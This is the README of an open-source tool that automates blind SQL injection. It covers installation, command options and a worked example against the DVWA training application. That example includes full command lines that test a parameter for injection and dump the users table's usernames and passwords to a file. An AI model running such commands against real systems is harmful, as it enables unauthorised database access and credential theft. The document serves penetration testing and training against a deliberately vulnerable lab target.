<h1 align="center">
	<br>blindpie<br>
</h1>

<h4 align="center">Automatically exploit blind-SQLi vulnerabilities</h4>

<p align="center">
	<a href="https://github.com/alessiovierti/blindpie/releases">
		<img src="https://img.shields.io/github/release/alessiovierti/blindpie.svg">
	</a>
	<a href="https://travis-ci.org/alessiovierti/blindpie">
		<img src="https://travis-ci.org/alessiovierti/blindpie.svg?branch=master">
	</a>
</p>

<p align="center">
	<a href="#installation">Installation</a> •
	<a href="#features">Features</a> •
	<a href="#usage">Usage</a> •
	<a href="#examples">Examples</a> •
	<a href="#tips">Tips</a> •
	<a href="#contributing">Contributing</a>
</p>

<img align="center" src="https://i.imgur.com/tfMaLG9.gif" alt="Demo Long Fetch">

### Installation

```
pip install blindpie
```

### Features

- Test if any parameter is exploitable
- **Fast** multithreading fetching of a table
- Dump part of a table or keep fetching until stopped / until end of table
- Dump results on a TSV file
- Use custom headers for HTTP requests
- Define the default values of the other parameters in the requests

### Usage

<h4 align="center">Testing parameters</h4><p></p>

<img align="center" src="https://i.imgur.com/0D9Zyx0.gif" alt="Demo Test">

```
usage: blindpie.py test [-h] -M method -P params [-H headers] [-T threshold]
                        [-I max_interval]

optional arguments:
  -h, --help            show this help message and exit
  -M method, --method method
                        the HTTP method for the requests
  -P params, --params params
                        the parameters to test and their default values (must
                        be a JSON dictionary)
  -H headers, --headers headers
                        the headers for the requests (must be a JSON
                        dictionary)
  -T threshold, --threshold threshold
                        threshold used to decide if an answer is affirmative
                        or negative (must be greater than 1)
  -I max_interval, --max_interval max_interval
                        max time to wait between each request in ms
```

<h4 align="center">Fetching a table</h4><p></p>

<img align="center" src="https://i.imgur.com/ubsFh8M.gif" alt="Demo Short Fetch">

```
usage: blindpie.py fetch_table [-h] -M method -P params [-H headers]
                               [-T threshold] [-I max_interval] -p
                               vulnerable_param -t table -c columns
                               [-r from_row] [-n n_rows]
                               [--min_row_length min_row_length]
                               [--max_row_length max_row_length]
                               [-o output_path]

optional arguments:
  -h, --help            show this help message and exit
  -M method, --method method
                        the HTTP method for the requests
  -P params, --params params
                        the parameters and their default values (must be a
                        JSON dictionary)
  -H headers, --headers headers
                        the headers for the request (must be a JSON
                        dictionary)
  -T threshold, --threshold threshold
                        threshold used to decide if an answer is affirmative
                        or negative (must be greater than 1)
  -I max_interval, --max_interval max_interval
                        max time to wait between each request in ms
  -p vulnerable_param, --vulnerable_param vulnerable_param
                        the vulnerable parameter to exploit
  -t table, --table table
                        the name of the table to fetch
  -c columns, --columns columns
                        the columns to select
  -r from_row, --from_row from_row
                        the row from which to start to select
  -n n_rows, --n_rows n_rows
                        the number of rows to select
  --min_row_length min_row_length
                        limit selection to rows with this min length
  --max_row_length max_row_length
                        limit selection to rows with this max length
  -o output_path, --output_path output_path
                        path to the output file
```

### Examples

Let's consider for example the [Damn Vulnerable Web Application](http://www.dvwa.co.uk), in particular its page `vulnerabilities/sqli_blind/`.

The page shows a form to search information about a user. The form sends a GET request with parameters `id` and `Submit`.

To test which parameters are exploitable we can use the `test` command:

- First, we need to prepare a default request which contains the default values for the parameters, as a JSON dictionary:

	`{"id":"1","Submit":"Submit"}`

- Then we need to prepare the headers (if you don't provide any `blindpie` will use some default ones). In this case the page requires a PHPSESSID value in the Cookie header (and a cookie `security` to set the security level of DVWA):

	`{"Cookie":"PHPSESSID={YOUR_PHPSESSID};security=medium"}`

The following command will find which parameters are exploitable:

```
$ blindpie.py -u {YOUR_DVWA_INSTANCE}/vulnerabilities/sqli_blind/ test -M get -P '{"id":"1","Submit":"Submit"}' -H '{"Cookie":"PHPSESSID={YOUR_PHPSESSID};security=medium"}'
```

`blindpie` will find out that the `id` parameter is indeed exploitable.

Let's say, for example, that we want to dump the `user` table, by selecting its columns `user` and `password` by exploiting the vulnerability we found.

The following command will dump the fetched rows into a TSV file:

```
$ blindpie.py -u {YOUR_DVWA_INSTANCE}/vulnerabilities/sqli_blind/ fetch_table -M get -P '{"id":"1","Submit":"Submit"}' -H '{"Cookie":"PHPSESSID={YOUR_PHPSESSID};security=medium"}' -p "id" -t "users" -c "user,password"
```

If you want to end the fetching before it may be completed, stop it with <kbd>CTRL</kbd>+<kbd>C</kbd>.
You'll find the dumped table in a file named `blindpie.out` in your working directory.

### Tips

`blindpie` gives you some ways of getting faster or more reliable results:

- `--threshold` can make fetching much faster when it's close to 1 but it will be also much less reliable.
- `--max_interval` can make requests more distant one with the other. Choose wisely since an high value will make fetching much slower. When testing local targets you should use 0.
- `--min_row_length` and `--max_row_length` can help get faster results by limiting the search to rows with length in this range.

### Contributing

If you have any idea, tip, or you want to contribute in any way, open an issue or contact me in any way you prefer.

If you want to have a look at how the project is structured check `./docs/uml/uml.svg`.

If you wanna play with it or extend it use the `Makefile` to install the requirements (`$ make init`) or launch the tests (`$ make test`).

### Authors

* **Alessio Vierti** - *Initial work*

### License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
